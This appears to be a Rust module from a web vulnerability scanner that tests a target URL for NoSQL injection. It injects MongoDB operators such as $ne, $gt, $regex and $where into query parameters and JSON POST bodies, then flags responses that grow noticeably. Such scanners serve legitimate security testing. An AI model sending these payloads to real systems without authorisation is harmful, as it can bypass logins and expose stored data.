use colored::*;
use crate::core::client::HttpClient;
use crate::core::analyzer::Analyzer;

/// NoSQL Injection detection
pub async fn detect(target: &str) -> anyhow::Result<()> {
    println!("{} Testing: NoSQL Injection", "[*]".yellow());

    let params = Analyzer::extract_params(target);
    if params.is_empty() { return Ok(()); }

    let client = HttpClient::new()?;
    let baseline = Analyzer::send_and_analyze(&client, target, "").await?;

    for (param_name, _original_val) in &params {
        // Query-string operator injection
        let nosql_payloads = vec![
            (format!("{}[$ne]", param_name), "null_bypass"),
            (format!("{}[$gt]", param_name), "gt_bypass"),
            (format!("{}[$regex]", param_name), ".*"),
        ];

        // Modify URL to inject NoSQL operators
        for (modified_param, value) in &nosql_payloads {
            let test_url = if target.contains('?') {
                format!("{}&{}={}", target, modified_param, value)
            } else {
                format!("{}?{}={}", target, modified_param, value)
            };

            if let Ok(result) = Analyzer::send_and_analyze(&client, &test_url, "").await {
                // If NoSQL operator causes different behavior than original
                let len_diff = (result.response_body.len() as i64 - baseline.response_body.len() as i64).unsigned_abs();
                if result.status_code == 200 && len_diff > 100 && result.response_body.len() > baseline.response_body.len() {
                    println!(
                        "{} POTENTIAL: NoSQL Injection via operator '{}' in param '{}'",
                        "[!]".red().bold(), modified_param, param_name
                    );
                    println!("    Response size diff: {} bytes", len_diff);
                }
            }
        }

        // JSON body-based NoSQL injection
        let json_payloads = vec![
            format!(r#"{{"{}": {{"$ne": null}}}}"#, param_name),
            format!(r#"{{"{}": {{"$gt": ""}}}}"#, param_name),
            format!(r#"{{"{}": {{"$regex": ".*"}}}}"#, param_name),
            format!(r#"{{"$where": "this.{} == this.{}"}}"#, param_name, param_name),
        ];

        for payload in &json_payloads {
            if let Ok(resp) = client.inner.post(target)
                .header("Content-Type", "application/json")
                .body(payload.clone())
                .send().await
            {
                let body = resp.text().await?;
                if body.len() > baseline.response_body.len() + 100 {
                    println!(
                        "{} POTENTIAL: NoSQL Injection via JSON body in param '{}'",
                        "[!]".red().bold(), param_name
                    );
                    println!("    Payload: {}", payload);
                    return Ok(());
                }
            }
        }
    }

    Ok(())
}
